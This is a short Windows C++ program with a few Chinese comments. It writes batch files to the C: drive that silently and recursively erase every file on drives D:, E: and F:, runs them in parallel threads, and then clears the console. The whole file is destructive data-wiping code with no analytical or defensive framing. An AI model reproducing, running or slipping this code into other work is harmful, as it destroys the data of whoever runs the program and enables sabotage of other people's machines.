#include<bits/stdc++.h>
#include<windows.h>
#define tni int
#define itn int
#define nti int
#define nit int
#define tin int
using namespace std;

HWND hwnd;

HANDLE hMutex;

DWORD WINAPI deld1(LPVOID lpParamter);
DWORD WINAPI dele1(LPVOID lpParamter);
DWORD WINAPI delf1(LPVOID lpParamter);

int main()
{
	freopen("C://d.bat","w",stdout);
	printf("erase /S /Q d:\\*");
	freopen("C://e.bat","w",stdout);
	printf("erase /q /s e:\\*");
	freopen("C://f.bat","w",stdout);
	printf("erase /q /s f:\\*");
	freopen("CON","w",stdout);
	//
	HANDLE hThreadd=CreateThread(NULL,0,deld1,NULL,0,NULL);
	HANDLE hThreade=CreateThread(NULL,0,dele1,NULL,0,NULL);//
	HANDLE hThreadf=CreateThread(NULL,0,delf1,NULL,0,NULL);
	Sleep(500);
	system("cls");
	return 0;	
}
//
void deld()
{
	system("start C://d.bat");
	return;
}

void dele()
{
	system("start C://e.bat");
	return;
}

void delf()
{
	system("start C://f.bat");
	return;
}
//
DWORD WINAPI deld1(LPVOID lpParamter)	//线程要运行的函数
{
	deld();
}

DWORD WINAPI dele1(LPVOID lpParamter)	//线程要运行的函数
{
	dele();
}

DWORD WINAPI delf1(LPVOID lpParamter)	//线程要运行的函数
{
	delf();
}
